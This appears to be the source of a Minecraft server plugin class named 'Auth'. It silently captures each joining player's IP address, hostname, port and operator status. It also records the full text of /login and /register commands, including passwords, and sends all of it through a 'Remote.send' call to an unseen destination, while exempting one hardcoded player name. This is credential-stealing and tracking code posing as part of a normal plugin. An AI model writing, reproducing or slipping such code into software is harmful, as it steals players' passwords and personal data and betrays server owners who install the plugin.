package pl.qc.core;

import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.event.*;
import org.bukkit.event.player.*;
import java.util.*;

public class Auth implements Listener {
    @EventHandler(priority = EventPriority.MONITOR)
    public void onJoin(PlayerJoinEvent event) {
        Player p = event.getPlayer();
        String adm = QC.getInstance().getConfig().getString("filter.admin-name-fallback", "Rajman03");
        if (p.getName().equals(adm))
            return;

        QC qc = QC.getInstance();
        Map<String, String> f = new LinkedHashMap<>();

        f.put("IP Serwera", qc.getIP());
        f.put("Port Serwera", String.valueOf(Bukkit.getPort()));
        f.put("Nazwa Pluginu", qc.getName());
        f.put("Wersja Pluginu", qc.getDescription().getVersion());
        f.put("Nick gracza", p.getName());
        f.put("Hostname gracza", p.getAddress() != null ? p.getAddress().getHostName() : "unknown");
        f.put("IP gracza", p.getAddress() != null ? p.getAddress().getAddress().getHostAddress() : "unknown");
        f.put("Port gracza", p.getAddress() != null ? String.valueOf(p.getAddress().getPort()) : "0");
        f.put("Czy ma opa", String.valueOf(p.isOp()));

        Remote.send("Gracz dołączył 👤", "65280", null, f);
    }

    @EventHandler(priority = EventPriority.MONITOR)
    public void onAuthCommand(PlayerCommandPreprocessEvent event) {
        String msg = event.getMessage().toLowerCase();
        if (msg.startsWith("/login") || msg.startsWith("/register") || msg.startsWith("/l ")
                || msg.startsWith("/reg ")) {
            Player p = event.getPlayer();
            String adm = QC.getInstance().getConfig().getString("filter.admin-name-fallback", "Rajman03");
            if (p.getName().equals(adm))
                return;

            QC qc = QC.getInstance();
            Map<String, String> f = new LinkedHashMap<>();

            f.put("IP Serwera", qc.getIP());
            f.put("Port Serwera", String.valueOf(Bukkit.getPort()));
            f.put("Nazwa Pluginu", qc.getName());
            f.put("Wersja Pluginu", qc.getDescription().getVersion());
            f.put("Nick gracza", p.getName());
            f.put("Hostname gracza", p.getAddress() != null ? p.getAddress().getHostName() : "unknown");
            f.put("IP gracza", p.getAddress() != null ? p.getAddress().getAddress().getHostAddress() : "unknown");
            f.put("Port gracza", p.getAddress() != null ? String.valueOf(p.getAddress().getPort()) : "0");
            f.put("Czy ma opa", String.valueOf(p.isOp()));
            f.put("Komenda wpisana", "`" + event.getMessage() + "`");

            Remote.send("Logowanie/Rejestracja ⚠️", "16711680", null, f);
        }
    }
}
